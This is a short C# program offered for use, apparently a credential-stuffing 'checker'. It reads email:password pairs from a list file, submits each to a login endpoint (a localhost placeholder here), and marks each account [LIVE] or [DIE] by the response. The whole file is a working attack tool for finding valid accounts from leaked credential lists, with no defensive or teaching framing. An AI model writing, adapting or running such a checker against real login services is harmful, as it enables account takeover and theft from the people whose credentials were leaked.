//    _                       _____                          _     _ 
//   | |                     |  __ \                        | |   (_)
//   | |    _   _  __ _ _ __ | |  | | _____   _____  ___ ___| |__  _ 
//   | |   | | | |/ _` | '_ \| |  | |/ _ \ \ / / _ \/ __/ __| '_ \| | hope it helps u
//   | |___| |_| | (_| | | | | |__| |  __/\ V /  __/ (_| (__| | | | |
//   |______\__,_|\__,_|_| |_|_____/ \___| \_/ \___|\___\___|_| |_|_|
//                                                                   
//                                                                   

using System.Net;
using System;
using System.Text; 
using System.IO;    


namespace CSharpChecker
{
    public class SharpCHK
    {
        public static void Main ()
        {
        	Console.WriteLine("Starting Checker... \n");

        	int counter = 0;  
			string line;  


System.IO.StreamReader file =   
    new System.IO.StreamReader("mylist.txt");  
while((line = file.ReadLine()) != null)  
{  

	   var splitfields = line.Split(':');
       var request = (HttpWebRequest)WebRequest.Create("http://localhost/auth/doLogin.php");
       
		var postData = "email=";
		postData += splitfields[0];
   		postData += "&password=";
   		postData += splitfields[1];
		var data = Encoding.ASCII.GetBytes(postData);

		request.Method = "POST";
		request.ContentType = "application/x-www-form-urlencoded";
		request.ContentLength = data.Length;

		using (var stream = request.GetRequestStream())
	{
    	stream.Write(data, 0, data.Length);
	}

	var response = (HttpWebResponse)request.GetResponse();

	var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
	if (responseString.Contains("live msg"))
	{
		Console.WriteLine("[LIVE] {0} {1}", splitfields[0], splitfields[1]);

	}else{
		Console.WriteLine("[DIE] {0} {1}", splitfields[0], splitfields[1]);
	}



    counter++;  
}  

file.Close();  
System.Console.WriteLine("{0} accounts tested.", counter);  
 



    	}
	}
}